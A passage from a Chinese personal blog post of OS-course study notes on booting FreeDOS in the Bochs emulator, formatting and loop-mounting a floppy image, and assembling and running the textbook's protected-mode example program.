bochsrc，所以你想跑那个也不是不行）。</p>
<p>在 bochs.sourceforge.io 上下载的这个，虽然描述说的是 "10-meg hard
disk image which boots into FreeDOS"，但其实这个 hard disk image
指的是压缩包里的 c.img，另外两个软盘 a.img 和 b.img
虽然在示例中没有作为启动盘使用，但它们也是启动盘。</p>
<p>我直接把 <code>boot: c</code> 改成 a 和 b 试了一下。a.img
是可以正常且完整启动的。b.img 可以看得出进入了引导程序，但是内核或 FAT
的加载似乎出现了什么问题。我暂时没有去细究这个 b。但是书本上教的把 a.img
复制出来改成 freedos.img 当启动盘用确实是可行的。</p>
<p>P.S. 事实上，通过下面的指令，我们也可以看出它是一个启动盘：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C a.img | <span class="built_in">head</span> -50</span><br></pre></td></tr></table></figure>
<p>你可以在其中 0200 前（也就是 511 和 512 字节处）观察到 55 和
aa。结合上节课的知识，这个 a.img 会被识别为启动盘。</p>
<p>事实上，我们也可以考虑把 a.img 和 b.img 的前 512
个字节搞出来反汇编一下观察下差别，来满足我们的好奇心。这里暂时留个坑罢。</p>
<h3 id="在-bochs-中运行-freedos">2.1.3 在 Bochs 中运行 Freedos</h3>
<p>前面我们下载到了 freedos 映像的压缩文件。把其中的 a.img
弄出来作为启动盘，然后创建一个新的空白软盘 pm.img 来存放我们希望 guest
os 能访问的文件。</p>
<p>为方便辨认，我把 a.img 改名成了 freedos.img。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf freedos-img.tar.gz</span><br><span class="line"><span class="built_in">cp</span> freedos-img/a.img ./freedos.img</span><br><span class="line">bximage -func=create -fd=1.44M -q pm.img</span><br><span class="line">vim bochsrc</span><br></pre></td></tr></table></figure>
<p>把 bochsrc 修改为下面的内容：（其实就是上章用的那些修改了一下）</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># how much memory the emulated machine will have</span><br><span class="line">megs: 32</span><br><span class="line"></span><br><span class="line"># filename of ROM images</span><br><span class="line">romimage: file=/usr/local/share/bochs/BIOS-bochs-latest</span><br><span class="line">vgaromimage: file=/usr/share/vgabios/vgabios.bin</span><br><span class="line"></span><br><span class="line"># what disk images will be used</span><br><span class="line">floppya: 1_44=freedos.img, status=inserted</span><br><span class="line">floppyb: 1_44=pm.img, status=inserted</span><br><span class="line"></span><br><span class="line"># choose the boot disk.</span><br><span class="line">boot: a</span><br><span class="line"></span><br><span class="line"># where do we send log messages?</span><br><span class="line"># log: bochsout.txt</span><br><span class="line"></span><br><span class="line"># disable the mouse</span><br><span class="line">mouse: enabled=0</span><br><span class="line"></span><br><span class="line"># enable key mapping, using US layout as default.</span><br><span class="line"># keyboard_mapping: enabled=1, map=/usr/share/bochs/keymaps/x11-pc-us.map</span><br><span class="line"></span><br><span class="line">display_library: sdl</span><br></pre></td></tr></table></figure>
<p>接下来，运行 bochs，成功启动的话可以看到 freedos 的命令行界面。</p>
<figure>
<img src="/.com//after_boot.png" alt="after_boot">
<figcaption aria-hidden="true">after_boot</figcaption>
</figure>
<p>那个 format 是我自己打进去的，为了确认键盘能不能用。</p>
<p>如果你遇到的报错是 no boot device，请检查你的启动盘有没有设置对。</p>
<p>不过也有非常多人遇到了进入 bochs 后 freedos
内键盘无法使用的问题，这个我也不清楚怎么解决。（指的是完全打不了字或一打字
bochs 就报错。我们后面用的那个示例 .com
是个死循环，运行后是关不掉也用不了键盘的，只能关掉 bochs）</p>
<h3 id="软盘格式化与挂载">2.1.4 软盘格式化与挂载</h3>
<p>在 freedos 下，你可以运行下面的指令来格式化 B 盘（也就是
pm.img）。</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">format</span> B:\</span><br></pre></td></tr></table></figure>
<p>不同于前面直接将二进制代码写入扇区，在 dos 下运行 .com 需要借助
freedos 的文件系统，所以我们需要先把 pm.img 格式化。如果不这么做的话，在
mount 时会因为无法识别文件系统类型而报错。</p>
<p>其实，你也可以不用到 freedos 下进行格式化，直接在 linux
下执行下面的指令也是可以的。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.fat pm.img</span><br></pre></td></tr></table></figure>
<p>被上述指令格式化的软盘是可以被 freedos 使用的。它默认格式化为 fat12
格式。</p>
<p>P.S.
格式化指根据用户选定的文件系统（如FAT12、FAT16、FAT32、NTFS、EXT2、EXT3等），在磁盘的特定区域写入特定数据，以达到初始化磁盘或磁盘分区、清除原磁盘或磁盘分区中所有文件的一个操作。一个什么都没有的空白软盘和格式化后的软盘是不一样的。</p>
<p>使用下面指令可以挂载，和取消挂载。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 挂载前需要新建文件夹</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> /mnt/floppy</span><br><span class="line">sudo mount -o loop pm.img /mnt/floppy</span><br><span class="line"><span class="comment"># 可以像正常文件系统那样访问读写这个文件夹</span></span><br><span class="line">sudo <span class="built_in">cp</span> a.txt /mnt/floppy</span><br><span class="line"><span class="comment"># 取消挂载</span></span><br><span class="line">sudo umount /mnt/floppy</span><br></pre></td></tr></table></figure>
<p>P.S. 什么是 loop device？它是一种“伪设备”。我们的 pm.img
上虽然有一个文件系统，但它毕竟是虚拟的，不是一个真正的硬件，不能直接访问。所以我们可以用
-o loop（也可以指定具体的 loop device），这样 pm.img
就会与这个伪设备关联，然后我们就得到了一个可挂载的设备。这样我们就可以通过挂载和访问这个设备来访问这个虚拟的文件系统了。</p>
<p>（上面的这段参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30832351/article/details/98198529">这篇
CSDN 博客</a>和<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Loop%E8%AE%BE%E5%A4%87">维基百科</a>）</p>
<p>不管你是不是挂载到 /mnt/xxx
下，被你挂载的文件夹都会被加上权限限制（毕竟是在访问一个设备），所以
mount 以及对文件系统的操作都需要在 root 或 sudo 下进行。</p>
<p>书上的做法是在 cp 完 .com
文件后取消挂载。其实不取消也行，没必要每次都挂载一下。</p>
<h3 id="运行随书示例">2.1.5 运行随书示例</h3>
<p>dos 下直接运行 .com，会将代码挂到虚拟地址 0100h
处，需要在代码第一行加上 org 0100h。</p>
<p>编译 asm 源码，然后复制到挂载的软盘上，启动 bochs，在 Freedos
上运行即可。</p>
<p>具体的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 注意 这一步要求 pm.inc 和 pmtest1b.asm 在同个目录下</span><br><span class="line">nasm pmtest1b.asm -o pmtest1b.com</span><br><span class="line"># 复制到挂载好的软盘里</span><br><span class="line">sudo cp pmtest1b.com /mnt/floppy</span><br><span class="line"># 运行 bochs</span><br><span class="line">bochs</span><br><span class="line"># 在 freedos 下运行下面指令</span><br><span class="line">B:\pmtest1b.com</span><br></pre></td></tr></table></figure>
<p>运行成功后，你会在 bochs 显示屏上看到一个红色的
P。但是接下来你就无法进行任何操作了，只能关掉 bochs 或用 debug
想办法退出，因为这个程序是个死循环。</p>
<h2 id="随书汇编源码解读">2.2 随书汇编源码解读</h2>
<h3 id="彩蛋当你试图将随书源码作为引导程序">2.2.1
（彩蛋）当你试图将随书源码作为引导程序</h3>
<p>freedos 下执行 .com
程序，不知道会被挂载到什么地方，因此难以设置断点，需要一些额外的手段（后文会提到）。</p>
<p>而引导程序的虚拟地址与逻辑地址是对应的，设置断点非常容易。当然，这种做法是有局限的，有些实验源码使用了
dos 设置的中断（如 21h 的 4ch 带返回值退出程序）。或是程序大于 510
个字节。这些是没有办法用这种手段调试的。</p>
<p>当然，pmtest1.asm
是可以用这种方式调试的。但是，它有一个问题。就是它的末尾并没有
0xaa55。</p>
<p>但是我们不能再使用 <code>times 510-($-$$) db 0</code>
来凑了。因为这个程序有非常多的段。而 <code>$$</code>
针对的是当前的段。</p>
<p>一种办法是拿我们之前用过的 a.img。它的末尾本来就含有
0xaa55，而我们是非截断写入，因此末尾这两个字节是会保留的。</p>
<p>另一种方法是用下面的指令来写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -ne <span class="string">&quot;\x55\xaa&quot;</span> | <span class="built_in">dd</span> of=a.img seek=510 bs=1 count=2 conv=notrunc</span><br></pre></td></tr></table></figure>
<p><code>-ne</code>
的意思是不换行且使用转义符号。其实换不换行无所谓，反正只取前两个字节，取不到后面的
<code>\10</code>（换行符）。这里出于强迫症保证了输出只有两个字节。<code>seek=510</code>
就是从第 510 个字节开始写入（从 0 开始数）。其它之前介绍过了。</p>
<p>你可能会像我一样，直接就把上面这条指令直接写到 makefile
里去了。然后发现写进 a.img 的不是 0xaa55，而是 0x6e2d。</p>
<p>查一下 ascii 码表，你会发现它把 "-n"
当成字符串了。这是怎么回事呢？</p>
<p>其实是 shell 的差异导致的。<a target="_blank" rel="noopener" href="https://blog.csdn.net/haifeng_gu/article/details/73332242">这篇博客讲的很清楚</a>，解决了困扰我大半天的问题。</p>
<h3 id="一点小小的个人经验">2.2.2 一点小小的个人经验</h3>
<p>其实这一章全是非常枯燥的知识，东西很多。学的时候看的我头昏眼花。</p>
<p>我本来是打算把知识点什么的全部写进来的，但是编排起来实在有点难度，而且感觉不太符合我的风格（<del>其实就是单纯的懒和烦</del>）。</p>
<p>所以就讲一下我个人的经验吧：</p>
<blockquote>
<p>因为源码是有很详细的注释的。直接看源码，看不懂的部分再去查书和
PPT，效率就会大幅提升。</p>
</blockquote>
<p>当然这只是个人经验。具体怎么学舒服还得看自己。</p>
<p>以及自己动手写是很重要的。虽然他给的代码非常的长，可能没有什么自己动手写的欲望。但自己敲一遍（至少在回答动手做问题的时候）还是有必要的。口胡永远比不上自己会敲。</p>
<p>后面有空时会逐渐补全各部分的知识点。包括第一章中的一些还可以深入了解的东西也会抽空补全。</p>
<h3 id="有趣问题记录">2.2.3 有趣问题记录</h3>
<p>其实本来是想分析一波原理的。但是实验报告里抄来抄去截来截去已经累死了，原理什么的就自己看书吧。这里只记录下自己在学习时遇到的一些无法理解的有趣问题和分析。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Qing-LKY"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Qing-LKY</p>
  <div class="site-description" itemprop="description">可爱就是正义！</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Qing-LKY/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qing-LKY&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.cnblogs.com/Qing-LKY/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Qing-LKY&#x2F;" rel="noopener" target="_blank">Past blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.xinyang.life/" title="https:&#x2F;&#x2F;blog.xinyang.life&#x2F;" rel="noopener" target="_blank">Xinyang's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.cnblogs.com/ctrl-newbee/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;ctrl-newbee&#x2F;" rel="noopener" target="_blank">Ctrlnewbee</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Qing-LKY</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">70k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">1:56</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
